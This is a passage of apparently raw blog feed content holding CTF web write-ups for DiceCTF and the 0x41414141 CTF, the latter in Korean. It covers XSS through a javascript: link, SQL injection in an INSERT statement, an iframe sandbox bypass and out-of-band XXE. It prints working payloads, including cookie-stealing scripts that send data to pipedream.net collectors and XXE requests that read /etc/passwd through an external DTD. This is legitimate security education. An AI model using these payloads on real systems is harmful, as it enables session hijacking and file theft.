class="javascript">      <span class="keyword">if</span> (! id) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> fetch(<span class="string">`<span class="subst">$&#123;<span class="built_in">window</span>.origin&#125;</span>/api/data/<span class="subst">$&#123;id&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> &#123; data, type &#125; = <span class="keyword">await</span> res.json();</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! data || ! type ) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (type === <span class="string">&#x27;link&#x27;</span>) <span class="keyword">return</span> <span class="built_in">window</span>.location = data;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (<span class="built_in">document</span>.readyState !== <span class="string">&quot;complete&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, r); &#125;);</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.title = <span class="string">&#x27;Paste&#x27;</span>;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).textContent = data;</span></span><br><span class="line">    &#125;)()</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as <code>javascript:alert(1)</code>, you can trigger xss.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">async</span> (fastify) =&gt; &#123;</span><br><span class="line">  fastify.post(<span class="string">&#x27;createLink&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">const</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;^https?://&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (! regex.test(req.body.data))</span><br><span class="line">        <span class="keyword">return</span> rep</span><br><span class="line">        </span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the link creation logic, the value of <code>req.body.data</code> is verified with a regular expression. So, you can’t put xss payload in the link creation logic.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line">fastify.post(<span class="string">&#x27;createPaste&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      database.addData(&#123; <span class="attr">type</span>: <span class="string">&#x27;paste&#x27;</span>, ...req.body, uid &#125;);</span><br><span class="line">      rep</span><br><span class="line">        .code(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&quot;javascript:alert(1)&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br><span class="line">&#123;&quot;data&quot;:&quot;javascript:location.href&#x3D;&#39;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;&#39;%2bdocument.cookie&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br>   </p><blockquote><p>FLAG : dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}</p></blockquote><hr><h2 id="Web-Build-a-Panel-130-pts"><a href="#Web-Build-a-Panel-130-pts" class="headerlink" title=" (Web) Build a Panel [130 pts]"></a><span style="color:#21C587"></span> (Web) Build a Panel [130 pts]</h2><blockquote><p> The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/admin/debug/add_widget&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.cookies;</span><br><span class="line">    <span class="keyword">const</span> queryParams = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cookies[<span class="string">&#x27;token&#x27;</span>] &amp;&amp; cookies[<span class="string">&#x27;token&#x27;</span>] == secret_token)&#123;</span><br><span class="line">        query = <span class="string">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;panelid&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetname&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetdata&#x27;</span>]&#125;</span>&#x27;);`</span>;</span><br><span class="line">        db.run(query, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">                res.send(<span class="string">&#x27;something went wrong&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.send(<span class="string">&#x27;success!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.<br></p><p>If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains <code>FLAG</code>. (panelid is stored in a cookie.)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;build-a-panel.dicec.tf&#x2F;admin&#x2F;debug&#x2F;add_widget?panelid&#x3D;pocas&amp;widgetname&#x3D;adfdaf&amp;widgetdata&#x3D;a&#39;), (&#39;pocas&#39;, (select flag from flag), &#39;&#123;&quot;type&quot;:&quot;pocas&quot;&#125;&#39;)--</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{ch41n_ChAIn_aNd_m0Re_cHaIn}</p></blockquote><hr><h2 id="Web-Web-IDE-196-pts"><a href="#Web-Web-IDE-196-pts" class="headerlink" title=" (Web) Web IDE [196 pts]"></a><span style="color:#21C587"></span> (Web) Web IDE [196 pts]</h2><blockquote><p>The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.</p></blockquote><ul><li>Scenario<br></li></ul><ol><li>We are using <code>allow-scripts</code> as an option for iframe, and the value we input is executed by the eval function in sandbox.html.</li><li>The path to the administrator’s cookie is /ide, so it is not easy to read the cookie. Because xss payload runs in /sandbox.html.</li><li>So, first you need to create a separate site and bypass the iframe sandbox.</li><li>If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.</li><li>However, since xss payload is executed in <code>/sandbox.html</code>, it cannot read the admin cookie.</li><li>So, create an object using <code>window.open(&quot;/ide&quot;)</code>, and execute xss payload on the object to steal the cookie.<br></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xss poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">sendMessage</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// window open -&gt; make file -&gt; include it</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;[].constructor.constructor(\&quot;(async () =&gt; &#123;const res = await fetch(&#x27;https://web-ide.dicec.tf/ide/save&#x27;, &#123;method:&#x27;POST&#x27;, headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/javascript&#x27;&#125;, body: &#x27;const myWindow = window.open(\\\&quot;/ide\\\&quot;); (async (myWindow) =&gt; &#123; await setTimeout( async() =&gt; &#123;await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=$&#123;myWindow.document.cookie&#125;`)&#125;, 500) &#125;)(myWindow)&#x27;&#125;); const file_name = await res.text(); const scr = document.createElement(&#x27;script&#x27;); scr.src = `/ide/saves/$&#123;file_name&#125;`; document.body.appendChild(scr);&#125;)()\&quot;)()&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;sendMessage()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;hh&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://web-ide.dicec.tf/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x41414141 CTF Write Up</title>
      <link href="2021/01/30/2021-01-31-0x414141410CTF/"/>
      <url>2021/01/30/2021-01-31-0x414141410CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/team.png?raw=true"></p><p>2021년 1월 26일 저녁에 <code>Ainsetin</code>님이 씨텝 같이 하자고 하셔서 31일까지 참여를 했었는데 많은 도움이 되지 못 한 거 같아 스스로 반성을 많이 한 대회입니다. 여튼 이번 대회에는 버스를 타서 14등을 했고, 솔브수가 그나마 적은 웹 3 문제의 Write Up을 작성해보겠습니다.<br></p><hr><h2 id="Web-Special-Order-pt2-490-pts"><a href="#Web-Special-Order-pt2-490-pts" class="headerlink" title=" (Web) Special Order pt2 [490 pts]"></a><span style="color:#21C587"></span> (Web) Special Order pt2 [490 pts]</h2><blockquote><p>Special Order pt2 문제는 웹 애플리케이션 취약점을 찾고, OOB XXE를 이용해서 flag를 긁어오는 문제입니다.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/1.png?raw=true"></p><p>문제로 들어오면 login 폼이 보이고, 바로 밑에 회원 가입 링크가 있는 것을 볼 수 있습니다. 그러니 그냥 가입하고, 로그인을 해주면 됩니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/2.png?raw=true"></p><p>로그인을 하고 들어오면 <code>special Order</code> 블로그가 나오는 것을 볼 수 있고, 위에 보면 <code>HOME</code>, <code>POST</code>, <code>POST SETTING</code>, <code>CREATE POST</code>가 있는 것을 볼 수 있습니다. 취약점은 <code>POST SETTING</code>에서 터집니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/3.png?raw=true"></p><p><code>POST SETTING</code>로 들어오면 폰트 색상과 폰트 사이즈를 정해서 보낼 수 있습니다. 한 번 요청을 보내 헤더를 잡아보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:50:42 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 7</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">DONE :D</span><br></pre></td></tr></table></figure><p>요청 헤더를 보면 색상과 사이즈를 json으로 보내는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:52:00 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Start tag expected, &#39;&lt;&#39; not found, line 1, column 1 (&lt;string&gt;, line 1)</span><br></pre></td></tr></table></figure><p>여기서 Content-Type을 <code>application/xml</code>로 바꿔서 보내주면 XML Parsing 에러가 나는 것을 볼 수 있습니다. 이 말은 XML이 작동 중이며 XXE 공격이 가능하다는 소리입니다. 일단 색상과 사이즈의 크기는 응답에 포함되지 않기 때문에 일반적인 XXE 기법을 이용할 순 없습니다. 그래서 <code>Out-of-band XXE</code> 기법을 이용하기로 했고, 해당 기법을 쓸려면 일단 DTD를 로드 할 수 있는 지 확인해야합니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 175</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE pocas [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;test&quot;&gt;]&gt;</span><br><span class="line">&lt;pocas&gt;</span><br><span class="line">    &lt;color&gt;&amp;xxe;&lt;&#x2F;color&gt;</span><br><span class="line">    &lt;size&gt;40px&lt;&#x2F;size&gt;</span><br><span class="line">&lt;&#x2F;root&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Aapache Log</span><br><span class="line">207.180.200.166 - - [31&#x2F;Jan&#x2F;2021:12:14:10 +0000] &quot;GET &#x2F;test HTTP&#x2F;1.0&quot; 404 456 &quot;-&quot; &quot;-&quot;</span><br></pre></td></tr></table></figure><p>확인을 해보니 잘 되는 것을 볼 수 있습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 170</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.96 Safari&#x2F;537.36</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:04:41 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 1343</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;ash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">(생략)</span><br><span class="line">guest:x:405:100:guest:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">uwsgi:x:100:101:uwsgi:&#x2F;dev&#x2F;null:&#x2F;sbin&#x2F;nologin</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>처음 해보는 기법이라 해외 <a href="https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/">블로그</a>를 보며 공부를 하고, 진행했는데 좀 신기했습니다. 여튼 oob xxe를 이용해서 <code>/etc/passwd</code>를 긁어오니 잘 긁어오는 것을 볼 수 있습니다. 이제 FLAG가 들어있는 파일만 읽으면 되는데 파일을 모르니 한 번 찾아보겠습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 168</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE root [</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % xxe SYSTEM &quot;http:&#x2F;&#x2F;141.164.52.207&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%xxe;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 12:17:57 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 102</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Invalid URI: http:&#x2F;&#x2F;141.164.52.207&#x2F;flag&#123;i7_1s_n0t_s0_bl1nd3721&#125;</span><br><span class="line">, line 2, column 77 (evil.dtd, line 2)</span><br></pre></td></tr></table></figure><p>그래서 <code>flag</code>, <code>flag.php</code>, <code>flag.txt</code>를 하나 하나 다 확인 해보니 <code>flag.txt</code>가 존재했고, FLAG가 읽히는 것을 볼 수 있었습니다.<br></p><blockquote><p>FLAG : flag{i7_1s_n0t_s0_bl1nd3721}</p></blockquote><hr><h2 id="Web-firstapp-496-pts"><a href="#Web-firstapp-496-pts" class="headerlink" title=" (Web) firstapp [496 pts]"></a><span style="color:#21C587"></span> (Web) firstapp [496 pts]</h2><blockquote><p>firstapp 문제는 SSRF 취약점을 이용해서 내부 서버에 있는 파일을 릭하는 문제입니다.<br></p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/1.png?raw=true"></p><p>일단 문제로 들어오면 login이 되지 않았다고 뜨는 것을 볼 수 있습니다. 여기서 <code>/login</code>이 존재할 거 같다는 생각을 할 수 있고, <code>/login</code>으로 가서 아무 아이디/비밀번호로 로그인을 하면 로그인이 됩니다.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/firstapp/2.png?raw=true"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;&lt;name&gt;</span><br></pre></td></tr></table></figure><p>로그인을 하고 들어오면 위와 같이 3개의 프로필이 있는 것을 볼 수 있습니다. 프로필은 위와 같이 <code>/profile</code>에서 <code>id</code> 파라미터로 참조하게 됩니다.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;profile?id&#x3D;flag</span><br></pre></td></tr></table></figure><p>그래서 <code>id</code>의 값으로 flag를 주니 <code>flag.png</code> 파일이 하나 나오는데 처음에는 이 사진을 HxD로 열어서 확인하면 FLAG가 있을 줄 알았는데 존재하지 않았습니다. 그래서 일단 여기까지 하고 답이 없어서 Dirb를 이용해서 디렉터리 브루트 포싱을 진행했습니다.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 